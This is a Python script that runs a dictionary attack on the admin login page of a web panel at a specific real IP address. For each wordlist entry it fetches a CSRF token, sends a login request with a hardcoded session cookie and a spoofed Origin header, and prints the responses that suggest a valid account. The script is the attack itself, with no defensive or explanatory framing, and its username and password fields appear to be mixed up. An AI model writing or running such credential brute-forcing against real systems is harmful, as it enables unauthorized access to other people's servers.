import re

import requests
import json
import dict
import onetoken

url = "http://107.148.14.141/admin/publics/index.html"
headers = {
    'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0",
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    "Referer": "http://107.148.14.141/admin/publics/index.html",
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Length': '74',
    'Origin': 'http://185.194.148.224',
    'Connection': 'close',
    'Cookie': 'PHPSESSID=j3t2jmh9avipjjdi8o1k2bofo4; think_var=zh-cn'
}


def login2():
    token2 = token1
    data = {"__token__": token2, "username": password, "password": "password"}
    login_request = requests.post(url, data=data, headers=headers)

    msg_re = re.compile(r'\"msg\"\:\"(.*?)\"')
    msg = msg_re.findall(login_request.text)
    if msg[0] == "用户不存在或被禁用！":
        pass
        # print(password+msg[0])
    elif msg[0] == "密码必须6-30个字符":
        pass

    else:
        print(password + msg[0])
        return msg[0], url, password


for i in range(len(dict.pw)):
    token1 = onetoken.token()[0]
    password = dict.pw[i]
    login2()

